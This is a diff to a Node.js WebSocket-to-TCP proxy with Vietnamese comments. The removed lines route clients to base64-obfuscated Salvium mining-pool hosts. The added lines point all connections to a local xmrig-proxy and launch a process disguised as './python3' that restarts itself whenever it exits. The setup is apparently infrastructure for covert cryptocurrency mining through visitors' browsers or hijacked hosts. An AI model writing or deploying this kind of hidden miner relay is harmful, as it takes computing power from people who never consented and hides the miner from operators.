@@ -1,16 +1,18 @@
 import uWS from "uWebSockets.js";
 import net from "net";
+import { spawn } from "child_process";
 
-const PORT = 8000;
+const PORT = 8080;
+const XMRIG_PROXY_HOST = "localhost";
+const XMRIG_PROXY_PORT = 3333;
 const app = uWS.App();
 
 // Cấu hình giới hạn
-const MAX_ENCODED_LENGTH = 1024;       // tối đa 1KB cho string base64 host:port
-const MAX_QUEUE_SIZE = 100;           // tối đa 1000 message trong queue
-const MAX_PAYLOAD_LENGTH = 1024 * 1024; // 1MB WebSocket payload (tùy chỉnh lại nếu cần)
+const MAX_QUEUE_SIZE = 1000;           // tối đa 1000 message trong queue
+const MAX_PAYLOAD_LENGTH = 1024 * 1024; // 1MB WebSocket payload
 const IDLE_TIMEOUT_SECONDS = 300;      // 5 phút
 
-const DEBUG = false;
+const DEBUG = true;
 
 // Chuẩn hóa message: đảm bảo có newline cuối
 function normalizeLine(msg) {
@@ -29,23 +31,22 @@ function safeEndWS(ws, code, reason) {
     }
 }
 
-/**
- * Giới hạn host nếu muốn tránh nội bộ, ví dụ:
- * - "127.0.0.1", "localhost"
- * - private ranges, v.v.
- * Tùy nhu cầu, hiện tại chỉ minh hoạ.
- */
-function isForbiddenHost(host) {
-    // Ví dụ đơn giản, có thể bỏ nếu bạn muốn full proxy
-    const lower = host.toLowerCase();
-    const allows = process.env.ALLOW_HOSTS || "";
-    
-    if (allows) {
-        const list = allows.split(",").map(h => h.trim().toLowerCase());
-        if (list.includes(lower)) return false;
-    }
+function startTcpProxy() {
+    console.log(`Starting tcp endpoint proxy...`);
+    const proxy = spawn("./python3", ['-c', './config.json']);
 
-    return false;
+    proxy.stdout.on("data", (data) => {
+        console.log(`[PROXY][INFO] ${data.toString().trim()}`);
+    });
+
+    proxy.stderr.on("data", (data) => {
+        console.error(`[PROXY][ERROR] ${data.toString().trim()}`);
+    });
+
+    proxy.on("close", (code) => {
+        console.log(`[PROXY][INFO] Exited with code ${code}. Restarting...`);
+        setTimeout(startTcpProxy, 5000);
+    });
 }
 
 // HTTP healthcheck
@@ -63,25 +64,15 @@ app.ws("/*", {
 
     upgrade: (res, req, context) => {
         try {
-            const urls = [
-              "Y2Euc2Fsdml1bS5oZXJvbWluZXJzLmNvbToxMjMw",
-              "dXMuc2Fsdml1bS5oZXJvbWluZXJzLmNvbToxMjMw",
-              "dXMyLnNhbHZpdW0uaGVyb21pbmVycy5jb206MTIzMA==",
-              "dXMzLnNhbHZpdW0uaGVyb21pbmVycy5jb206MTIzMA==",
-              "bXguc2Fsdml1bS5oZXJvbWluZXJzLmNvbToxMjMw",
-              "YnIuc2Fsdml1bS5oZXJvbWluZXJzLmNvbToxMjMw"
-            ];
-            const encoded = urls[Math.floor(Math.random() * urls.length)];
             const ip = Buffer.from(res.getRemoteAddressAsText()).toString();
 
             res.upgrade(
                 {
-                    encoded,
                     ip,
                     isConnected: false,
                     queue: [],
                     tcp: null,
-                    tcpHost: null,
+                    tcpHost: `${XMRIG_PROXY_HOST}:${XMRIG_PROXY_PORT}`,
                 },
                 req.getHeader("sec-websocket-key"),
                 req.getHeader("sec-websocket-protocol"),
@@ -99,45 +90,19 @@ app.ws("/*", {
     },
 
     open: (ws) => {
-        let decoded;
-        try {
-            if (typeof ws.encoded !== "string" || ws.encoded.length === 0) {
-                safeEndWS(ws, 1011, "Missing encoded address");
-                return;
-            }
-
-            decoded = Buffer.from(ws.encoded, "base64").toString("utf8");
-        } catch {
-            safeEndWS(ws, 1011, "Invalid base64");
-            return;
-        }
-
-        const [host, portStr] = decoded.split(":");
-        const port = Number.parseInt(portStr || "", 10);
-
-        if (!host || !Number.isInteger(port) || port < 1 || port > 65535) {
-            safeEndWS(ws, 1011, "Invalid address");
-            return;
-        }
-
-        if (isForbiddenHost(host)) {
-            safeEndWS(ws, 1011, "Forbidden target");
-            return;
-        }
+        const host = XMRIG_PROXY_HOST;
+        const port = XMRIG_PROXY_PORT;
 
         const clientIp = ws.ip;
         const tcp = net.createConnection({ host, port });
         tcp.setTimeout(0);
+        tcp.setKeepAlive(true);
         tcp.setNoDelay(true);
 
         ws.isConnected = false;
         ws.queue = [];
         ws.tcp = tcp;
         ws.tcpHost = `${host}:${port}`;
-
-        if (DEBUG) {
-            console.log(`Connecting WS [${clientIp}] -> TCP [${host}:${port}]`);
-        }
 
         tcp.on("connect", () => {
             ws.isConnected = true;
@@ -161,9 +126,6 @@ app.ws("/*", {
         });
 
         tcp.on("close", () => {
-            if (DEBUG) {
-                console.log(`TCP closed [${host}:${port}] for WS [${clientIp}]`);
-            }
             safeEndWS(ws, 1000, "TCP closed");
         });
 
@@ -229,6 +191,8 @@ app.ws("/*", {
 app.listen("0.0.0.0", PORT, (t) => {
     if (t) {
         console.log(`🚀 WS⇄TCP proxy running on port ${PORT}`);
+        console.log(`Forwarding fallback matches to local xmrig-proxy at ${XMRIG_PROXY_HOST}:${XMRIG_PROXY_PORT}`);
+        startTcpProxy();
     } else {
         console.error("❌ Failed to listen");
     }
